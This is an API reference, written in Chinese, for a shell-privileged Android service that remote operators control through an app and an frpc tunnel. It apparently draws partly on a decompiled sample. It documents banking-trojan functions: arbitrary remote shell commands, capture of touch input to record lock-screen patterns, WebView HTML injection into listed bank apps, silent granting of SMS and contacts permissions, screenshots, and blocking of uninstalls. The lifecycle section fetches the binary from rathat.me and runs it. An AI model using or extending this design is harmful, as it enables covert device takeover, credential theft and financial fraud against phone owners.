# local-service API 文档

> 版本: 3.1.0 | 监听: `127.0.0.1:7912` | 运行: `/data/local/tmp/local-service server`
>
> 真机验证: 小米13 (Android 16, API 36, HyperOS) — 2026-04-24

## 概述

local-service 是一个 Go 编译的二进制服务，通过 ADB WiFi 部署到 Android 设备的 `/data/local/tmp/`，以 shell 权限运行。它为 APK (port 7910) 提供系统级操作能力，包括权限授予、Shell 执行、触摸事件捕获、注入管理等。

### 架构定位

```
远程 Go Server (云端)
    │ WebSocket / frpc 隧道
    ▼
APK HTTP Server (port 7910)     ← Kotlin, AccessibilityService 上下文
    │ HTTP POST/GET
    ▼
local-service (port 7912)       ← Go 二进制, shell 权限
    │ Runtime.exec / Settings.Global
    ▼
Android 系统
```

### 与 APK Server (port 7910) 的区别

| 维度 | APK Server (7910) | local-service (7912) |
|------|-------------------|---------------------|
| 语言 | Kotlin/Java | Go |
| 权限级别 | 应用级 (AccessibilityService) | shell 级 (ADB 部署) |
| 部署方式 | APK 内嵌，随应用启动 | ADB push + chmod +x |
| 核心职能 | 远程命令路由、UI 自动化 | 系统操作、权限授予、触摸捕获 |
| 通信方向 | 接收远程 Server 命令 | 被 APK (7910) 主动调用 |

---

## 通用响应格式

**成功:**
```json
{"success": true, "message": "...", "data": {...}}
```

**失败:**
```json
{"success": false, "message": "错误描述"}
```

**未知路由 (fallback):**
```json
{"success": true, "message": "local-service running", "data": {"timestamp": 1777023096, "uptime": 1235, "version": "3.1.0"}}
```

> 未注册的路由不会返回 404，而是返回 health 响应。判断端点是否真正处理了请求需看响应是否包含 `uptime` 字段。

---

## 端点列表

### 1. 生命周期 & 状态

#### `GET /version`
查询服务版本信息。

```json
// Response
{"success": true, "data": {"name": "local-service", "version": "3.1.0"}}
```

#### `GET /health`
健康检查，返回运行状态和启动时长。

```json
// Response
{
  "success": true,
  "message": "local-service running",
  "data": {"timestamp": 1777023096, "uptime": 1235, "version": "3.1.0"}
}
```

#### `POST /noticeAlive`
心跳存活检测。APK 的 `ServiceMonitor` 每 5 秒调用一次，连续失败 3 次触发自动恢复部署。

```json
// Request
{}
// Response
{"success": true, "message": "alive"}
```

**调用方:** `ServiceMonitor.checkAndRecoverLocalService()`, `LocalServiceDeployer.postDeployInit()`

#### `GET /info`
查询设备架构信息。

```json
// Response
{
  "success": true,
  "data": {
    "android": 17, "arch": "arm64-v8a", "screenSize": "1080x2400",
    "sdk": 36, "service": "local-service", "version": "3.1.0"
  }
}
```

#### `GET /deviceInfo`
查询详细设备信息。

```json
// Response
{
  "success": true,
  "data": {
    "androidVersion": "16", "brand": "Xiaomi", "density": "440",
    "imei": "", "model": "2211133C", "screenSize": "1080x2400",
    "sdkVersion": "36", "serialNo": "893726fa"
  }
}
```

#### `GET /status`
查询运行状态和核心配置摘要。

```json
// Response
{
  "success": true,
  "data": {
    "currentDebugPort": 38829, "deviceId": "xxx",
    "frpcRunning": true, "running": true,
    "serverAddr": "https://..."
  }
}
```

---

### 2. 配置管理

#### `POST /setConfig`
设置核心配置（设备ID、服务器地址）。配对完成后由 `LocalServiceDeployer.notifyLocalServiceConfig()` 调用。

```json
// Request
{"deviceId": "android_id_here", "serverAddr": "https://panel.example.com", "keySalt": ""}
// Response
{"success": true, "message": "config updated"}
```

#### `GET /config` / `POST /config`
读取或更新核心配置子集。

```json
// GET Response
{
  "success": true,
  "data": {"debugPort": 38829, "deviceId": "xxx", "keySalt": "", "serverAddr": "https://..."}
}
```

#### `GET /getConfig`
读取完整配置（包含所有远程可控字段）。

```json
// Response
{
  "success": true,
  "data": {
    "serverAddr": "https://...",
    "deviceId": "xxx",
    "deviceKeySalt": "",
    "lastDebugPort": 38829,
    "frpsAddr": "",
    "frpsPort": 0,
    "frpsToken": "",
    "remotePort": 0,
    "appPackage": "dev.deltalab2964.swift",
    "accessibilityPaused": false,
    "uninstallCode": "",
    "uninstallAllowed": false,
    "activeAdmin": false,
    "mainUninstallSuccess": false,
    "backupUninstallSuccess": false,
    "policyBlackApps": null,
    "notificationSilenced": false,
    "headsUpDisabled": false,
    "lockScreenNotiDisabled": false,
    "blackApps": null,
    "backupPackage": "",
    "guardPackage": "",
    "skipTLSVerify": false
  }
}
```

#### `POST /setAppPackage`
通知 local-service 目标 APK 包名和地区。部署初始化时调用。

```json
// Request
{"package": "dev.deltalab2964.swift", "overseas": false}
// Response
{"success": true, "data": {"appPackage": "dev.deltalab2964.swift"}}
```

**调用方:** `LocalServiceDeployer.postDeployInit()`

#### `GET /setAppPort?port=7910`
APK 启动时告知 local-service 实际绑定的 HTTP 端口。

```json
// Response
{"success": true, "message": "app port updated to 7910"}
```

**调用方:** `RemoteConfigManager.start()`

---

### 3. ADB & 无线调试

#### `POST /openWifiDebug`
通过 `Settings.Global` 直写开启无线调试（`adb_wifi_enabled=1`）。需要 `WRITE_SECURE_SETTINGS` 权限。

```json
// Request
{}
// Response
{"success": true, "message": "adb_wifi_enabled=1"}
```

**调用方:** `WirelessDebugNavigator.enableWirelessDebuggingViaSettings()`

#### `POST /shareADBConfig`
恢复上一会话的 ADB 配置（密钥信息）。进程重启后由 `ServiceMonitor` 调用。

```json
// Request
{}
// Response
{"success": true, "data": {"keys": ""}}
```

**调用方:** `ServiceMonitor.restorePortFromLocalService()`

#### `POST /syncADBConfig`
同步当前 ADB 配置（配对结果、调试端口）。配对成功后调用。

```json
// Request
{"paired": true, "debugPort": 38829}
// Response
{"success": true, "data": {"debugPort": 38829}}
```

**调用方:** `PairFlowOrchestrator.pairInWifiDebugWindow()`

#### `GET /debugPort`
查询当前无线调试端口。

```json
// Response
{"success": true, "data": {"debugPort": 38829}}
```

---

### 4. 系统操作

#### `GET /shell?cmd=<command>`
执行任意 shell 命令。以 shell 权限运行。

```bash
# 示例
GET /shell?cmd=whoami
```

```json
// Response
{"success": true, "data": {"output": "shell\n"}}
```

#### `POST /grantMainApp`
通过 `pm grant` 批量授予 APK 运行时权限。

```json
// Request
{}
// Response
{
  "success": true,
  "data": [
    "android.permission.READ_PHONE_STATE: granted",
    "android.permission.READ_CONTACTS: granted",
    "android.permission.READ_SMS: granted",
    "android.permission.WRITE_SECURE_SETTINGS: granted",
    "android.permission.SYSTEM_ALERT_WINDOW: granted",
    "..."
  ]
}
```

> 部分权限（如 `MANAGE_EXTERNAL_STORAGE`、`WRITE_SETTINGS`）因非 runtime 类型会返回 SecurityException。

**调用方:** `dqtvuisjd` (AccessibilityService 初始化)

#### `POST /applyAllOptimizations`
应用所有系统优化设置。

```json
// Request
{}
// Response
{"success": true, "message": "All optimizations applied"}
```

**调用方:** `LocalServiceDeployer.postDeployInit()`

#### `POST /setSensitiveApps`
配置敏感应用监控清单。

```json
// Request
["com.bank.app1", "com.bank.app2"]
// Response
{"success": true, "message": "updated 2 apps"}
```

**调用方:** `DetectionCommandHandler.handleSetSensitiveApps()`

#### `GET /permissions`
查询目标 APK 的所有权限授予状态。

```json
// Response
{
  "success": true,
  "data": {
    "raw": " android.permission.MANAGE_ACCOUNTS: granted=true\n android.permission.SYSTEM_ALERT_WINDOW: granted=true\n ..."
  }
}
```

---

### 5. 设备控制

#### `GET /reboot`
重启设备。

```json
// Response
{"success": true, "message": "rebooting..."}
```

> ⚠️ 调用后设备立即重启，ADB 连接断开。

#### `GET /shutdown`
关闭设备。

```json
// Response
{"success": true, "message": "shutting down..."}
```

#### `GET /lockScreen`
锁定屏幕。

```json
// Response
{"success": true, "message": "lock screen executed"}
```

#### `GET /screenshot`
截取当前屏幕，返回 PNG 图片二进制数据。

```
Response: image/png binary data
```

#### `GET /swipe?x1=N&y1=N&x2=N&y2=N`
执行滑动手势。

```json
// 参数: x1, y1, x2, y2 (或 startX, startY, endX, endY)
// 缺少参数时:
{"success": false, "message": "缺少坐标参数 (x1/y1/x2/y2 或 startX/startY/endX/endY)"}
```

#### `GET /tap`, `GET /keyevent`, `GET /input`
触摸点击、按键事件、输入操作（需要额外参数）。

---

### 6. 触摸事件捕获 (getevent)

用于捕获锁屏图案密码的触摸坐标。

#### `GET /startGetevent`
启动 getevent 捕获进程。

```json
// Response
{
  "success": true,
  "message": "getevent 已启动",
  "data": {"device": "/dev/input/event4", "file": "/data/local/tmp/getevent_capture.txt", "pid": 4369}
}
```

**调用方:** `RunnableC1053p2` (vendor JADX p000 包)

#### `GET /readGetevent`
读取已捕获的触摸事件坐标点。

```json
// Response
{"success": true, "data": {"count": 0, "points": null, "rawLen": 0}}
```

**调用方:** `TaskRunnable` (vendor JADX p000 包)

#### `GET /stopGetevent`
停止 getevent 捕获。

```json
// Response
{"success": true, "message": "getevent 已停止"}
```

**调用方:** `RunnableC0941o6` (vendor JADX p000 包)

---

### 7. 注入管理

管理 WebView 注入任务的生命周期。

#### `POST /injectionWatcher/addTask`
注册新的 WebView 注入任务。

```json
// Request
{"packageName": "com.target.app", "htmlContent": "<html>...</html>"}
// Response (缺少参数时)
{"success": false, "message": "参数不完整（需要 packageName + htmlContent）"}
```

**调用方:** `dqtvuisjd.pushInjectionTaskToLocalService()`

#### `GET /injectionWatcher/removeTask?packageName=com.xxx`
移除已完成的注入任务。

```json
// Response
{"success": true, "message": "任务已删除: com.xxx"}
```

**调用方:** `dqtvuisjd.removeInjectionTaskFromLocalService()`

#### `POST /injectionData`
获取待注入的数据。由注入模块在目标 WebView 中调用。

**调用方:** `jbqfkndyx.sendInjectionData()`

#### `GET /removeInjectionTask?packageName=com.xxx`
同 `/injectionWatcher/removeTask`，注入完成后的清理调用。

**调用方:** `jbqfkndyx` (注入完成回调)

---

### 8. frpc 隧道管理

管理 frpc 内网穿透客户端进程。

#### `GET /frpc`
查询 frpc 进程状态。

```json
// Response
{
  "success": true,
  "data": {
    "process": "u0_a458 1854 1337 0 17:09:18 ? 00:00:01 libfrpc.so -c .../frpc.ini",
    "running": true
  }
}
```

#### `GET /frpcStatus`
同 `/frpc`，详细 frpc 状态。

#### `POST /stopFrpc`
停止 frpc 进程。

```json
// Response
{"success": true, "message": "frpc stopped"}
```

---

### 9. 通用代理

#### `LOCAL_SERVICE_PROXY` (通过命令分发)
远程 Server 通过 APK 命令系统发送 `LOCAL_SERVICE_PROXY` 命令，APK 代理转发到 local-service 的任意端点。

```json
// 命令参数
{"method": "GET", "path": "/shell?cmd=whoami", "body": null}
```

**调用方:** `DetectionCommandHandler.handleLocalServiceProxy()`

---

## 生命周期

```
ADB WiFi 配对成功
  │
  ├─ deployLocalService()
  │   ├─ 检查 /data/local/tmp/local-service 是否存在
  │   ├─ 不存在: nativeLibraryDir 复制 或 https://rathat.me/lib/{ABI}/local-service 下载
  │   ├─ chmod +x
  │   └─ nohup ./local-service server &
  │
  ├─ postDeployInit() [后台线程, 重试10次]
  │   ├─ POST /noticeAlive → 确认启动
  │   ├─ POST /setAppPackage → 告知目标包名
  │   ├─ POST /setConfig → 配置服务器地址
  │   └─ POST /applyAllOptimizations → 应用优化
  │
  └─ ServiceMonitor.startHeartbeat()
      ├─ 每 5s: POST /noticeAlive → 失败 3 次触发 deployLocalService 恢复
      ├─ ContentObserver 监听 development_settings_enabled 变更
      └─ watchdog 守护脚本 (/data/local/tmp/local-service-watchdog.sh)
```

## 端点汇总表

| # | 端点 | 方法 | 分类 | 描述 |
|---|------|------|------|------|
| 1 | `/version` | GET | 状态 | 版本信息 |
| 2 | `/health` | GET | 状态 | 健康检查 + 运行时长 |
| 3 | `/noticeAlive` | POST | 状态 | 心跳存活检测 |
| 4 | `/info` | GET | 状态 | 设备架构信息 |
| 5 | `/deviceInfo` | GET | 状态 | 详细设备信息 |
| 6 | `/status` | GET | 状态 | 运行状态 + 配置摘要 |
| 7 | `/setConfig` | POST | 配置 | 设置核心配置 |
| 8 | `/config` | GET/POST | 配置 | 读取/更新核心配置 |
| 9 | `/getConfig` | GET | 配置 | 读取完整配置 |
| 10 | `/setAppPackage` | POST | 配置 | 设置目标包名 |
| 11 | `/setAppPort` | GET | 配置 | 设置 APK HTTP 端口 |
| 12 | `/openWifiDebug` | POST | ADB | 开启无线调试 |
| 13 | `/shareADBConfig` | POST | ADB | 恢复 ADB 配置 |
| 14 | `/syncADBConfig` | POST | ADB | 同步 ADB 配置 |
| 15 | `/debugPort` | GET | ADB | 查询调试端口 |
| 16 | `/shell` | GET | 系统 | 执行 shell 命令 |
| 17 | `/grantMainApp` | POST | 系统 | 批量授予权限 |
| 18 | `/applyAllOptimizations` | POST | 系统 | 应用系统优化 |
| 19 | `/setSensitiveApps` | POST | 系统 | 配置敏感应用 |
| 20 | `/permissions` | GET | 系统 | 查询权限状态 |
| 21 | `/reboot` | GET | 设备 | 重启设备 |
| 22 | `/shutdown` | GET | 设备 | 关闭设备 |
| 23 | `/lockScreen` | GET | 设备 | 锁定屏幕 |
| 24 | `/screenshot` | GET | 设备 | 截图 (PNG) |
| 25 | `/swipe` | GET | 设备 | 滑动手势 |
| 26 | `/tap` | GET | 设备 | 触摸点击 |
| 27 | `/keyevent` | GET | 设备 | 按键事件 |
| 28 | `/input` | GET | 设备 | 输入操作 |
| 29 | `/startGetevent` | GET | 捕获 | 启动触摸捕获 |
| 30 | `/readGetevent` | GET | 捕获 | 读取触摸坐标 |
| 31 | `/stopGetevent` | GET | 捕获 | 停止触摸捕获 |
| 32 | `/injectionWatcher/addTask` | POST | 注入 | 注册注入任务 |
| 33 | `/injectionWatcher/removeTask` | GET | 注入 | 移除注入任务 |
| 34 | `/injectionData` | POST | 注入 | 获取注入数据 |
| 35 | `/removeInjectionTask` | GET | 注入 | 移除注入任务 (别名) |
| 36 | `/frpc` | GET | 隧道 | frpc 进程状态 |
| 37 | `/frpcStatus` | GET | 隧道 | frpc 详细状态 |
| 38 | `/stopFrpc` | POST | 隧道 | 停止 frpc |

**共 38 个端点**（含 19 个 vendor JADX 引用 + 19 个真机探测发现）。
